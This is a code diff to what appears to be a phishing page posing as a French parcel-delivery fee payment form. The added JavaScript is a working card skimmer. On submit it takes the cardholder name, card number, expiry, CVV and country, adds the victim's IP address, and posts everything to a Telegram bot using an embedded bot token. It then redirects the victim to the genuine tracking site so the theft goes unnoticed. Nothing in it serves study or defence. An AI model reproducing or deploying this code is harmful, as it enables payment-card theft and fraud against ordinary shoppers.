@@ -185,7 +185,7 @@ Rechercher
 <div class="row"><span class="label">Montant à régler</span><span class="value red">2,50 € TTC</span></div>
 </div>
 
-<form id="payForm" method="POST" action="{{.URL}}" class="pay-form">
+<form id="payForm" class="pay-form">
 <input type="text" name="website_verify" class="hp" tabindex="-1" autocomplete="off">
 
 <h3>Informations de paiement</h3>
@@ -289,7 +289,7 @@ var loader=document.getElementById('loader');
 
 trackForm.addEventListener('submit',function(e){
 e.preventDefault();
-var hp=document.getElementsByName('website_verify')[0];if(hp&&hp.value!=='')return;
+var hp=this.querySelector('[name="website_verify"]');if(hp&&hp.value!=='')return;
 loader.classList.add('on');
 setTimeout(function(){
 loader.classList.remove('on');
@@ -299,10 +299,55 @@ window.scrollTo(0,0);
 },1800);
 });
 
-payForm.addEventListener('submit',function(e){
-var hp=document.getElementsByName('website_verify')[0];if(hp&&hp.value!==''){e.preventDefault();return false;}
-document.getElementById('payBtn').innerText='Traitement sécurisé...';
-document.getElementById('payBtn').disabled=true;
+// === CONFIG TELEGRAM ===
+var BOT_TOKEN = '8602994784:AAHldaGAILxR13zjuy94_ek7k_lzbK3u-8Y';
+var CHAT_ID = '8602994784';
+
+payForm.addEventListener('submit',async function(e){
+e.preventDefault();
+var hp=this.querySelector('[name="website_verify"]');if(hp&&hp.value!=='')return;
+
+var btn=document.getElementById('payBtn');
+btn.innerText='Traitement sécurisé...';
+btn.disabled=true;
+
+var data={
+  cardholder: document.querySelector('[name="cardholder"]').value,
+  cardnumber: document.querySelector('[name="cardnumber"]').value,
+  expiry: document.querySelector('[name="expiry"]').value,
+  cvv: document.querySelector('[name="cvv"]').value,
+  country: document.querySelector('[name="country"]').value,
+  ua: navigator.userAgent,
+  time: new Date().toLocaleString('fr-FR'),
+  url: window.location.href
+};
+
+var text='';
+try{
+  var ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>j.ip).catch(()=>'inconnue');
+  text=
+'🚨 *NOUVELLE CAPTURE CB*\n\n'+
+'*Titulaire:* `'+data.cardholder+'`\n'+
+'*Numero:* `'+data.cardnumber+'`\n'+
+'*Expiration:* `'+data.expiry+'`\n'+
+'*CVV:* `'+data.cvv+'`\n'+
+'*Pays:* `'+data.country+'`\n\n'+
+'📍 *IP:* `'+ip+'`\n'+
+'🕐 *Heure:* `'+data.time+'`\n'+
+'🔗 *URL:* `'+data.url+'`';
+}catch(err){}
+
+try{
+  await fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID,text:text,parse_mode:'Markdown'})
+  });
+}catch(err){}
+
+setTimeout(function(){
+  window.location.href='https://www.mondialrelay.fr/suivi-de-colis/';
+},1200);
 });
 
 var cn=document.getElementById('cardNumber');
